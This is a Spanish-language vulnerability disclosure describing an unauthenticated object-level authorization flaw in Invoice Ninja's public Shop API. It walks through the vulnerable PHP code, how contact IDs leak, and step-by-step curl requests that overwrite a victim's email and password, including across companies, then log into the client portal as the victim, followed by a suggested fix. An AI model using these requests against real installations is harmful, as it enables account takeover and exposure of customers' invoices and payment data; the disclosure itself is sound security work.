Shop API BOLA to account takeover_

CriticalBOLA / Account takeoverNo response
Invoice NinjaBOLAAccount TakeoverMulti-tenant

Alcance: toda la validación se realizó contra un despliegue Docker local de la release oficial invoiceninja-5-stable, sin utilizar instancias de producción ni datos de terceros. El maintainer no respondió al reporte y no se asignó CVE.

Durante la revisión de Invoice Ninja encontré una BOLA (Broken Object Level Authorization) no autenticada en la Shop API pública. El fallo permitía tomar la identidad y las credenciales de cualquier contacto de cliente cuyo ID hash pudiera obtenerse, incluso entre compañías distintas dentro de la misma instalación.

Confirmé que las credenciales modificadas permitían iniciar una sesión real y autenticada en el portal de clientes como la víctima original. El único requisito de la petición era un company_key válido, una clave no secreta diseñada para aparecer en el JavaScript público de un widget de tienda.

Resumen del flujo vulnerable

La ruta de creación pública estaba protegida únicamente por el flag enable_shop_api de la compañía y el header X-API-COMPANY-KEY:

POST /api/v1/shop/clients
X-API-COMPANY-KEY: <company_key>

El endpoint aceptaba un ID existente dentro de contacts[].id. La validación bloqueaba un ID numérico directo, pero decodificaba y conservaba una versión string:

if (is_numeric($contact['id'])) {
    unset($input['contacts'][$key]['id']);
} elseif (is_string($contact['id'])) {
    $input['contacts'][$key]['id'] = $this->decodePrimaryKey($contact['id']);
}

Ese valor llegaba a ClientContactRepository::save(), donde se cargaba el contacto mediante un find() sin scope de compañía ni de cliente:

$update_contact = ClientContact::find($contact['id']);
...
$update_contact->client_id = $client->id;
$update_contact->fill($contact);
$update_contact->password = Hash::make($contact['password']);
$update_contact->save();

El resultado era una cadena de operaciones sobre un registro existente:

client_contact_id controlado
        ↓
decodificación del ID hash
        ↓
ClientContact::find() sin scope
        ↓
sobrescritura de email, nombre y password
        ↓
reassign de client_id al cliente recién creado
        ↓
credenciales válidas del contacto víctima

Por qué cruzaba compañías

El salt de Hashids, configurado mediante config('ninja.hash_salt'), es global para toda la instalación y no está separado por compañía. Por tanto, un ID de contacto de cualquier compañía puede decodificarse y resolverse desde otra compañía cuando el atacante conoce su propio company_key.

company_id no es fillable en ClientContact, por lo que permanece el identificador de la víctima. Sin embargo, client_id se mueve al cliente creado por el atacante. El resultado es una referencia entre tenants: el contacto sigue asociado a la compañía víctima, pero apunta a un cliente controlado desde la compañía del atacante.

Comparación con el endpoint seguro

El endpoint hermano Shop\ClientController::show() realiza correctamente la consulta anónima:

GET /api/v1/shop/client/{contact_key}

Esta ruta utiliza contact_key, un token opaco diferente, y limita la consulta mediante company_id. En el mismo controlador coexistían dos caminos para el mismo caso de uso: uno correctamente aislado y otro que reutilizaba lógica de validación y repositorio del API autenticado sin aplicar el límite de tenant.

Descubrimiento del ID

Una posible fuente del ID de contacto era:

GET /api/v1/shop/invoice/{invitation_key}

Shop\InvoiceController::show() utilizaba InvoiceTransformer, que incluía por defecto las invitaciones de la factura. Cada entrada de invitación exponía un client_contact_id codificado junto con su propia clave, incluyendo invitaciones distintas de la solicitada.

Este era solo un camino de descubrimiento. Cualquier client_contact_id válido funciona independientemente de cómo se haya obtenido. Además, cuando HASH_SALT queda sin definir, el salt puede caer en una cadena vacía y los Hashids de las claves primarias se vuelven predecibles o precomputables offline.

Prueba de concepto local

Todos los ejemplos utilizan valores sintéticos y el host TARGET representa únicamente el despliegue local de prueba.

1. Toma de cuenta dentro de una compañía

curl -s -X POST http://TARGET/api/v1/shop/clients \
  -H "X-API-COMPANY-KEY: <company_key>" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"poc",
    "contacts":[{
      "id":"<existing_contact_hashid>",
      "first_name":"x",
      "last_name":"y",
      "email":"attacker@example.com",
      "password":"AttackerPass123"
    }]
  }'

La respuesta fue HTTP 200. El contacto existente tenía su email, nombre y password sobrescritos, y su client_id era reasignado al cliente recién creado.

2. Toma de cuenta cross-company

curl -s -X POST http://TARGET/api/v1/shop/clients \
  -H "X-API-COMPANY-KEY: <company_A_key>" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"poc",
    "contacts":[{
      "id":"<company_B_contact_hashid>",
      "first_name":"x",
      "last_name":"y",
      "email":"hijacked@example.com",
      "password":"HijackedPass123"
    }]
  }'

La compañía B resultó comprometida utilizando únicamente la clave de la compañía A. La base de datos confirmó que contact.company_id seguía apuntando a B, mientras contact.client_id apuntaba a un cliente propiedad de A.

3. Sesión del portal con las credenciales modificadas

curl -c jar.txt http://TARGET/client/login -o login.html
TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' login.html)

curl -b jar.txt -c jar.txt -X POST http://TARGET/client/login \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=hijacked@example.com" \
  --data-urlencode "password=HijackedPass123"

curl -b jar.txt http://TARGET/client/invoices

La respuesta fue 200 y la sesión quedó autenticada. El portal devolvió el nombre del contacto original y su enlace de perfil real, confirmando que no se trataba únicamente de una modificación de datos sino de una sesión como la víctima.

Impacto

Un atacante podía tomar cualquier contacto de cliente cuyo ID obtuviera, sin autenticarse más allá de una clave de widget pública. La explotación fue confirmada tanto dentro de una compañía como entre dos compañías no relacionadas en una instalación self-hosted con una sola base de datos.

Una vez modificadas las credenciales, el atacante obtenía acceso autenticado al portal del contacto víctima. Dependiendo de los datos asociados, esto podía exponer facturas, métodos de pago, documentos y estados de cuenta.

En Invoice Ninja Cloud, el pre requisito de controlar una compañía puede ser trivial si está habilitado el registro. En self-hosted, el endpoint /api/v1/signup bloquea el registro mediante CreateAccountRequest::authorize() cuando no se trata de una instalación hosted, por lo que el atacante necesita controlar previamente una compañía en la instalación objetivo.

Corrección sugerida

En StoreShopClientRequest::prepareForValidation() debería eliminarse por completo la rama elseif. Este endpoint crea un cliente nuevo mediante ClientFactory::create(), por lo que nunca debería decodificar ni conservar un contacts[].id existente.

Como defensa en profundidad, ClientContactRepository::save() debería aplicar scope de company_id y/o client_id en lugar de utilizar una búsqueda por clave primaria sin restricciones:

// No usar un lookup global para un contacto controlado por entrada externa.
ClientContact::where('company_id', $companyId)
    ->where('client_id', $clientId)
    ->find($contactId);

Estado

El hallazgo fue reportado siguiendo el proceso indicado en SECURITY.md. El maintainer no respondió y no se asignó CVE. La investigación queda publicada aquí, con datos sintéticos y sin referencias a una instancia de producción.
